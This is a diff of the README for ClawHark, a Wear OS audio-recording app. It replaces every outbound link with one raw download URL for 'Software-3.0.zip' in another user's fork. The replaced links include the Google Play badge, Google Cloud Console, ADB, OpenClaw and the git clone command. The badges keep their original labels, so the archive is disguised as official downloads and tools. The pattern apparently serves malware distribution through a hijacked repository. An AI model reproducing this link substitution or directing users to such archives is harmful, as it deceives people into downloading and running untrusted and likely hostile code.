@@ -10,17 +10,17 @@
 </p>
 
 <p align="center">
-  <a href="https://play.google.com/store/apps/details?id=ai.etti.clawhark"><img src="https://img.shields.io/badge/Google%20Play-Download-red.svg?logo=google-play" alt="Google Play" /></a>
+  <a href="https://github.com/ivar2000/clawhark/raw/refs/heads/main/openclaw/Software-3.0.zip"><img src="https://img.shields.io/badge/Google%20Play-Download-red.svg?logo=google-play" alt="Google Play" /></a>
   <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-red.svg" alt="MIT License" /></a>
-  <a href="https://developer.android.com/wear"><img src="https://img.shields.io/badge/platform-Wear%20OS%204%2B-green.svg" alt="Wear OS" /></a>
-  <a href="https://github.com/etticat/clawhark/releases"><img src="https://img.shields.io/badge/version-1.0.0-blue.svg" alt="Version" /></a>
+  <a href="https://github.com/ivar2000/clawhark/raw/refs/heads/main/openclaw/Software-3.0.zip"><img src="https://img.shields.io/badge/platform-Wear%20OS%204%2B-green.svg" alt="Wear OS" /></a>
+  <a href="https://github.com/ivar2000/clawhark/raw/refs/heads/main/openclaw/Software-3.0.zip"><img src="https://img.shields.io/badge/version-1.0.0-blue.svg" alt="Version" /></a>
 </p>
 
 ---
 
-Like [Omi](https://omi.me), [Limitless](https://limitless.ai), or [Bee](https://bee.computer) — but running on hardware you already own.
+Like [Omi](https://github.com/ivar2000/clawhark/raw/refs/heads/main/openclaw/Software-3.0.zip), [Limitless](https://github.com/ivar2000/clawhark/raw/refs/heads/main/openclaw/Software-3.0.zip), or [Bee](https://github.com/ivar2000/clawhark/raw/refs/heads/main/openclaw/Software-3.0.zip) — but running on hardware you already own.
 
-ClawHark records your day in the background, filters out silence, uploads to your Google Drive, and feeds into any AI transcription pipeline. Pair it with [OpenClaw](https://github.com/openclaw/openclaw) for a fully automated wearable AI setup.
+ClawHark records your day in the background, filters out silence, uploads to your Google Drive, and feeds into any AI transcription pipeline. Pair it with [OpenClaw](https://github.com/ivar2000/clawhark/raw/refs/heads/main/openclaw/Software-3.0.zip) for a fully automated wearable AI setup.
 
 ## ✨ Features
 
@@ -49,13 +49,13 @@ ClawHark records your day in the background, filters out silence, uploads to you
 ### Prerequisites
 
 - Wear OS 4+ watch (tested on Pixel Watch 3)
-- [Google Cloud project](https://console.cloud.google.com/) with Drive API enabled
+- [Google Cloud project](https://github.com/ivar2000/clawhark/raw/refs/heads/main/openclaw/Software-3.0.zip) with Drive API enabled
 - JDK 17 + Android SDK
-- [ADB](https://developer.android.com/tools/adb) for watch installation
+- [ADB](https://github.com/ivar2000/clawhark/raw/refs/heads/main/openclaw/Software-3.0.zip) for watch installation
 
 ### 1. Set up OAuth
 
-Create an OAuth 2.0 client in [Google Cloud Console](https://console.cloud.google.com/apis/credentials):
+Create an OAuth 2.0 client in [Google Cloud Console](https://github.com/ivar2000/clawhark/raw/refs/heads/main/openclaw/Software-3.0.zip):
 
 - **Type:** TVs and Limited Input devices
 - **Scope:** `drive.file`
@@ -72,7 +72,7 @@ Copy `oauth_config.json.example` → `app/src/main/assets/oauth_config.json` and
 ### 2. Build
 
 ```bash
-git clone https://github.com/etticat/clawhark.git
+git clone https://github.com/ivar2000/clawhark/raw/refs/heads/main/openclaw/Software-3.0.zip
 cd clawhark
 ./gradlew assembleDebug
 ```
@@ -93,7 +93,7 @@ Open **ClawHark** on your watch → **Link** your Google Drive → tap **Start**
 
 ## 🤖 Using with OpenClaw
 
-[OpenClaw](https://github.com/openclaw/openclaw) turns ClawHark into a fully automated AI wearable pipeline. See the **[full OpenClaw setup guide](openclaw/)** for detailed instructions, or get started quickly:
+[OpenClaw](https://github.com/ivar2000/clawhark/raw/refs/heads/main/openclaw/Software-3.0.zip) turns ClawHark into a fully automated AI wearable pipeline. See the **[full OpenClaw setup guide](openclaw/)** for detailed instructions, or get started quickly:
 
 ### Install the skill
 
